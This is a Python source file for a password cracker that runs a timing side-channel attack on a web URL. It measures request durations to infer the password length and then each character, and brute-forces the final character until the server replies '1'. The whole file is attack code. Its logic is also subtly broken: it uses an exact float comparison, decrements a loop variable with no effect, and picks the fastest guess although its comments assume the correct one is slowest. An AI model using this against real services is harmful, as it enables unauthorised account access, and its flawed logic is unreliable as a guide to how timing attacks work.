from Icracker import Cracker
import requests




# check 'repeat' times the duration for request/response to spcific url (url2check)
# return array with measured duration of requestqresponse to url
# find the password length
# logic: search for average highest duration
# assumption: duration for the correct length is higher than for length for incorrect length

class BasicCracker(Cracker):

    def find_pass_len(self,password_start_len=1):
        checks = self.analize(password_start_len)
        idx = 0
        for report in checks:
            if(report[1] == report[2] + 0.09):
                break
            idx += 1 
        print(f"Password length found: {idx}")
        return(idx)


    def find_password(self,length):
        password = ""
        for j in range(length-1):
            count = 0
            checks = []
            for i in range(len(self.POOL)):
                url1 = self.url + '/' + (password + self.POOL[i]+"_"*(length-j-1))
                print(f'checking for: {url1}')
                checks.append(min(self.timeit(url1, 3)))
                print(f'min time {checks[-1]}')
                if checks[-1] < min(checks) + 0.09:
                    print(checks[-1])
                    count += 1
                    if count > 1:
                        i = i-1
                        continue
            password += self.POOL[checks.index(min(checks))]
            print(password)

        return password


    def find_pass_last_char(self,password):
        for i in self.POOL:
            url1 = self.url + '/' + (password+i)
            print(f'checking for: {str(password+i)}')
            r = requests.get(url1, allow_redirects=True)
            if r.content == b'1':
                print(f'password found: {str(password+i)}')
                return str(password+i)
                